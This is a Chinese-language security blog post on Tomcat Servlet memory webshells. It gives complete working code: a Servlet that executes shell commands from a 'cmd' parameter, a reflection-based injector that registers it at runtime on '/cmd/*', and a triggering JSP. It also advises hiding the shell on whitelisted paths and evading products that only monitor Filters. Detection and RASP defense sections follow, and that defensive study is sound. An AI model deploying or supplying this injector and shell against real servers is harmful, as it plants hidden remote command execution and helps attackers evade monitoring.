---
title: Tomcat Servlet 内存马
date: 2025-12-27
categories: 
- 漏洞分析
tags: 
- tomcat
- servlet
- 内存马
- Java安全
---

# Servlet 内存马

Servlet 型内存马通过在 Tomcat 运行时动态注册恶意 Servlet，映射到指定 URL 路径，访问该路径即可触发命令执行。与 Filter 型内存马的区别在于：Servlet 作用于请求处理的末端（Filter 链之后），但同样不需要文件落地。

**本质**：模拟 `createWrapper` + `addChild` + `addServletMappingDecoded`，把恶意 `service` 代码 + `/shell` 路径组装进 `children` 与 Mapper 路由表，访问该路径即被路由到恶意 Servlet。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、Tomcat Servlet 架构

### 1.1 Servlet 在 Tomcat 中的位置

```
HTTP 请求
    ↓
Connector (CoyoteAdapter)
    ↓
Engine → Host → Context
    ↓
Mapper.map() — URL 路由匹配 → Wrapper
    ↓
StandardWrapperValve.invoke()
    ↓
ApplicationFilterChain → Filter 链
    ↓
Wrapper.getServlet().service()  ← 到这里
```

### 1.2 核心类关系

```
ContainerBase (抽象容器)
├── StandardEngine
├── StandardHost
├── StandardContext       → 管理所有 Wrapper
│   └── children: HashMap<String, Container>
│       └── StandardWrapper@/servletA
│       └── StandardWrapper@/servletB
└── StandardWrapper       → 封装单个 Servlet
    ├── servletClass: String
    ├── servletName: String
    ├── instance: Servlet (单例)
    └── instanceSupport: InstanceSupport (生命周期)
```

**关键数据结构**：

| 组件 | 作用 | 位置 |
|------|------|------|
| `StandardWrapper` | 封装一个 Servlet，管理其生命周期 | `StandardContext.children` |
| `ServletMapping` | URL 路径到 Wrapper 的映射 | `Context.servletMappings` |
| `Mapper` | 负责请求 URL 的路由分发 | Tomcat 全局单例 |

### 1.3 Wrapper 的创建与加载

```java
// Tomcat 启动时创建 Wrapper
// StandardContext.createWrapper()
public Wrapper createWrapper() {
    Wrapper wrapper = new StandardWrapper();
    wrapper.setParent(this);
    return wrapper;
}

// 添加子容器（将 Wrapper 注册到 Context）
wrapper.setName("HelloServlet");
wrapper.setServletClass("com.example.HelloServlet");
context.addChild(wrapper);

// 配置 URL 映射
context.addServletMappingDecoded("/hello", "HelloServlet");
```

---

## 二、动态注册原理

**核心思路**：获取 `StandardContext` → 创建 `StandardWrapper` → 设置 Servlet → 添加为子容器 → 配置 URL 映射。

**动态注册步骤**：

```
1. 编写恶意 Servlet 类
2. 获取 StandardContext 对象
3. 检查是否已存在同名 Wrapper（防重复）
4. 创建 StandardWrapper 实例
5. 设置 servletName 和 servletClass
6. 调用 context.addChild(wrapper) 注册
7. 调用 context.addServletMappingDecoded() 配置 URL 映射
8. 调用 wrapper.load() 初始化 Servlet（执行 init()）
```

> 获取 `StandardContext` 的通用反射链（`RequestFacade.request` → `connector.Request.getContext()`，或 `ServletContext` → `ApplicationContext` → `StandardContext`）见 [Filter 篇 2.1]({% post_url 2025-12-27-Tomcat_filter内存马的 %})。

### 2.1 URL 映射原理

Tomcat 使用 `Mapper` 组件做 URL → Wrapper 的路由匹配：

```
请求: /cmd/shell
    ↓
Mapper.map(MessageBytes, MappingData)
    ↓
遍历 Context 的 ServletMappings
    ↓
匹配成功 → MappingData.wrapper = matchedWrapper
    ↓
StandardContextValve → StandardWrapperValve → servlet.service()
```

`Context.addServletMappingDecoded()` 会将映射规则注册到内部 `Mapper` 中，新增的映射立即生效。

---

## 三、完整代码实现

### 3.1 恶意 Servlet 类

```java
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class ServletMemShell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) 
            throws IOException {
        handleRequest(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) 
            throws IOException {
        handleRequest(req, resp);
    }

    private void handleRequest(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                String result = exec(cmd);
                resp.setContentType("text/html;charset=UTF-8");
                resp.getWriter().write("<pre>" + result + "</pre>");
            } catch (Exception e) {
                resp.getWriter().write("Error: " + e.getMessage());
            }
        } else {
            resp.getWriter().write("Servlet Memory Shell Active");
        }
    }

    /**
     * 统一命令执行器（本系列 Filter / Servlet / Listener 三篇通用）
     * - 通过 shell 执行，支持管道、重定向等语法（/bin/sh -c 或 cmd /c）
     * - redirectErrorStream(true)：把 stderr 合并进 stdout，避免
     *   "先读 stdout 再读 stderr" 顺序读取时管道写满导致的两端互相阻塞
     * - 字节循环读取而非 Scanner，输出量大时不会阻塞
     */
    private static String exec(String cmd) throws Exception {
        String[] execCmd = System.getProperty("os.name").toLowerCase().contains("windows")
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        Process process = new ProcessBuilder(execCmd).redirectErrorStream(true).start();
        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
             InputStream is = process.getInputStream()) {
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            process.waitFor();
            return out.toString(System.getProperty("sun.jnu.encoding"));
        }
    }
}
```

### 3.2 注入器代码

```java
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;
import org.apache.catalina.startup.ContextConfig;
import javax.servlet.Servlet;
import java.lang.reflect.Field;

public class ServletMemShellInjector {

    /**
     * 注入 Servlet 内存马
     * @param context StandardContext 对象
     * @param servletName Servlet 名称
     * @param urlPattern URL 映射路径
     */
    public static void inject(StandardContext context, 
                               String servletName, 
                               String urlPattern) throws Exception {
        
        // Step 1: 检查是否已注入
        if (context.findChild(servletName) != null) {
            System.out.println("[!] Servlet already exists: " + servletName);
            return;
        }

        // Step 2: 创建 Wrapper
        StandardWrapper wrapper = (StandardWrapper) context.createWrapper();
        wrapper.setName(servletName);
        wrapper.setServletClass(ServletMemShell.class.getName());
        // loadOnStartup > 0：addChild() 内部触发 start() 时会立即 loadServlet()
        wrapper.setLoadOnStartup(1);

        // Step 3: 注册为 Context 的子容器
        // addChild() 内部（ContainerBase.addChildInternal）会自动调用 child.start()，
        // 由 loadOnStartup=1 触发 Servlet 实例化
        context.addChild(wrapper);

        // Step 4: 配置 URL 映射（新映射立即写入内部 Mapper，无需重启）
        context.addServletMappingDecoded(urlPattern, servletName);

        // Step 5: 幂等初始化（addChild 已触发 start，此处为防御性写法）
        wrapper.load();
        wrapper.start();
    }

    /**
     * 从 JSP 或反序列化入口调用
     */
    public static void injectFromRequest(javax.servlet.ServletRequest request) 
            throws Exception {
        // 获取 StandardContext
        StandardContext context = getStandardContext(request);
        inject(context, "ServletMemShell", "/cmd/*");
    }

    private static StandardContext getStandardContext(
            javax.servlet.ServletRequest servletRequest) throws Exception {
        Field requestField = servletRequest.getClass().getDeclaredField("request");
        requestField.setAccessible(true);
        org.apache.catalina.connector.Request request = 
            (org.apache.catalina.connector.Request) requestField.get(servletRequest);
        return (StandardContext) request.getContext();
    }
}
```

### 3.3 触发注入的 JSP

> 说明：以下 JSP 引用默认包类 `ServletMemShellInjector`，为**讲解简化**（假设恶意类已部署）。真实利用时 JSP 必须**自包含**——把恶意类内联进 `<%! %>` 并直接注册（写法见 [Valve 篇 3.4]({% post_url 2026-08-06-Tomcat_Valve内存马 %})），或由反序列化 `defineClass` 提供类；测试工程已提供自包含版本。

```jsp
<%@ page import="org.apache.catalina.core.*, org.apache.catalina.connector.Request,
    java.lang.reflect.Field" %>
<%
    try {
        // 获取 StandardContext
        Field reqF = request.getClass().getDeclaredField("request");
        reqF.setAccessible(true);
        Request req = (Request) reqF.get(request);
        StandardContext context = (StandardContext) req.getContext();

        ServletMemShellInjector.inject(context, "ServletMemShell", "/cmd/*");
        
        out.println("Servlet memory shell injected successfully!");
        out.println("Access: /cmd?cmd=whoami");
    } catch (Exception e) {
        out.println("Injection failed: " + e.getMessage());
        e.printStackTrace(new java.io.PrintWriter(out));
    }
%>
```

---

## 四、代码详解

### 4.1 Wrapper 与 Filter 的核心差异

| 对比维度 | Filter 内存马 | Servlet 内存马 |
|---------|--------------|---------------|
| **执行位置** | Servlet 之前（Filter 链中） | Filter 链之后（最终处理） |
| **目标对象** | `StandardContext.filterDefs` | `StandardContext.children` |
| **映射方式** | `FilterMap` 数组 | `servletMappings` + `Mapper` |
| **覆盖范围** | `/*` 匹配所有请求 | 精确路径匹配 |
| **优先级** | 靠前插入即优先执行 | 同等优先级（路径匹配） |
| **生命周期** | `init()` → `doFilter()` → `destroy()` | `init()` → `service()` → `destroy()` |

### 4.2 `context.addChild()` 做了什么

```java
// ContainerBase.addChildInternal()
private void addChildInternal(Container child) {
    // 1. 添加到 children 集合
    children.put(child.getName(), child);
    
    // 2. 设置父容器
    child.setParent(this);
    
    // 3. 触发 START 事件
    child.start();
    
    // 4. 通知所有监听器
    fireContainerEvent(ADD_CHILD_EVENT, child);
}
```

当 Wrapper 被添加为 Context 的子容器后，Tomcat 会自动将其纳入生命周期管理。

### 4.3 URL 路径匹配规则

Tomcat 支持四种 Servlet 映射规则：

| 映射模式 | 示例 | 优先级 |
|---------|------|--------|
| 精确匹配 | `/exact/path` | 最高 |
| 路径匹配 | `/admin/*` | 次高 |
| 扩展名匹配 | `*.do` | 第三 |
| 默认匹配 | `/` | 最低 |

`/cmd/*` 属于路径匹配，命中率仅次于精确匹配。

### 4.4 防重复注入

```java
if (context.findChild(servletName) != null) {
    return; // 同名 Wrapper 已存在
}
```

通过 `context.findChild(name)` 检查是否已存在同名子容器，避免重复注册。

### 4.5 版本兼容性

| Tomcat 版本 | Servlet 包 | 说明 |
|-------------|-----------|------|
| 8.x / 9.x | `javax.servlet` | 本系列代码适用 |
| 10.x / 11.x | `jakarta.servlet` | 需全局替换包名 |

- `addChild()` + `addServletMappingDecoded()` 的机制在 Tomcat 8/9/10/11 上一致，
  10+ 只需把 `javax.servlet` 换成 `jakarta.servlet`。
- 反射链依赖的字段（`RequestFacade.request`、`connector.Request.response`）在不同大版本间相对
  稳定，但属于私有字段，字段名变更时注入/回显会失败，实战前需确认目标版本。
- `wrapper.load()/start()` 与 `addChild()` 内部触发的 `start()` 相比是幂等操作
  （`LifecycleBase.start()` 对已 STARTED 状态直接返回），重复调用无副作用。

---

## 五、利用场景

### 5.1 作为 Filter 的备用通道

```java
// 场景：目标只允许特定路径通过，Filter 被拦截
// 解法：注入 Servlet 到白名单路径
context.addServletMappingDecoded("/public/health", "ServletMemShell");
// 访问：/public/health?cmd=id
```

### 5.2 绕过只检查 Filter 的防御

某些安全产品只监控 `FilterDef` 和 `FilterMap` 的变化，不检查 Wrapper 容器：

```
防御产品监控：
  ✅ FilterDef 注册
  ✅ FilterMap 注册
  ❌ Wrapper 注册（盲区）
  ❌ servletMapping 变更（盲区）
```

### 5.3 与 Filter 组合使用

```
请求 → FilterMemShell (记录日志, 放行)
     → ServletMemShell (执行命令, 回显)
```

Filter 负责隐蔽性（不干扰正常请求），Servlet 负责功能性（命令执行回显）。

---

## 六、检测方式

### 6.1 通过 JMX 检查 Servlet 列表

```bash
# 使用 JMX 查看所有已注册的 Servlet
jconsole → MBeans → Catalina → Context → /your-app → children
```

### 6.2 Arthas 在线排查

```bash
# 查看 StandardContext 的 children
vmtool --action getInstances \
  --className org.apache.catalina.core.StandardContext \
  --express 'instances[0].children' \
  --limit 10

# 搜索可疑 Wrapper
vmtool --action getInstances \
  --className org.apache.catalina.core.StandardWrapper \
  --express 'instances[0].servletClass' \
  --limit 20

# 查看 Servlet 映射（servletMappings 是实例字段，静态 OGNL 语法拿不到，需先拿实例）
vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express 'instances[0].servletMappings' --limit 10
```

### 6.3 内存 Dump 分析

```bash
# dump 堆内存
jmap -dump:live,format=b,file=servlet.hprof <pid>

# MAT / VisualVM 中搜索
# 1. 列出所有 StandardWrapper 实例
# 2. 检查 servletClass 字段是否为标准类
# 3. 对比基线数据
```

### 6.4 基线对比脚本

```java
// 获取当前所有 Servlet 映射
public static Map<String, String> getServletMappings(StandardContext ctx) {
    Map<String, String> mappings = new HashMap<>();
    for (Container child : ctx.findChildren()) {
        if (child instanceof Wrapper) {
            Wrapper w = (Wrapper) child;
            mappings.put(w.getName(), w.getServletClass());
        }
    }
    return mappings;
}
// 与部署时的预期列表对比，找出异常项
```

---

## 七、防御建议

| 层面 | 措施 | 实现方式 |
|------|------|----------|
| **运行时** | RASP Hook | 拦截 `ContainerBase.addChild()` 调用 |
| **运行时** | Security Manager | 禁止反射访问 `StandardContext` |
| **监控** | JVM Agent | 监控 `children` map 的变更 |
| **运维** | 定期巡检 | 对比 Servlet 基线 |

```java
// RASP Hook 示例（教学简化版）
@RuntimeType
public static void onAddChild(@This ContainerBase container,
                               @Argument(0) Container child) {
    if (!(container instanceof StandardContext)) {
        return;
    }
    // 正常启动 / 部署流程会经过 ContextConfig 调用栈，运行时反射注入没有它
    StackTraceElement[] stack = Thread.currentThread().getStackTrace();
    for (StackTraceElement frame : stack) {
        if (frame.getClassName().contains("ContextConfig")) {
            return; // 属于启动 / 部署流程，放行
        }
    }
    // 其余 addChild 调用（如运行时反射注入 Wrapper）→ 告警并阻断
    alert("Detected runtime Servlet injection: " + child.getName());
    throw new SecurityException("Suspicious container modification blocked");
    // 说明：以"调用栈是否含 ContextConfig"做白名单是教学简化；生产环境还需排除
    // Tomcat 热部署、嵌入式容器自身启动等合法场景，建议结合线程名与调用来源综合判断。
    }
```

---

## 八、总结

Servlet 内存马与 Filter 内存马的对比：

| 特性 | Servlet 内存马 | Filter 内存马 |
|------|---------------|---------------|
| 难度 | ⭐⭐ | ⭐⭐⭐ |
| 隐蔽性 | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| 灵活性 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 检测难度 | 较高 | 中等 |

**选择建议**：
- **优先 Filter**：覆盖范围广，能拦截所有请求，适合需要持续监控的场景
- **备选 Servlet**：更隐蔽（部分监控产品不检查 Wrapper），适合作为备用通道
- **组合使用**：Filter + Servlet 双保险，互为备份

> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Java Agent 内存马]({% post_url 2026-08-06-Java_Agent内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %}) | [Tomcat基础]({% post_url 2025-12-30-Tomcat基础 %})
